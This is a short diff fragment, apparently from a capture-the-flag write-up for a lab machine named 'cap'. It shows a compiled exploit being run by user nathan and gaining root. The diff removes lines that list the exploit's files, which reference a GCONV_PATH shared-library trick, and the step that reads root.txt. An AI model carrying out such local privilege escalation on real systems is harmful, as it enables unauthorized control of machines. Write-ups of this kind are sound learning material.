@@ -59,15 +59,6 @@ uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
 nathan@cap:/tmp/again$ ./exploit
 # id
 uid=0(root) gid=0(root) groups=0(root)
-# ls
-'GCONV_PATH=.'   Makefile   evil-so.c   evil.so   evildir   exploit   exploit.c
-# cd ../../
-# ls
-bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var
-# cd root
-# ls
-root.txt  snap
-# cat root.txt
 
   ```
 
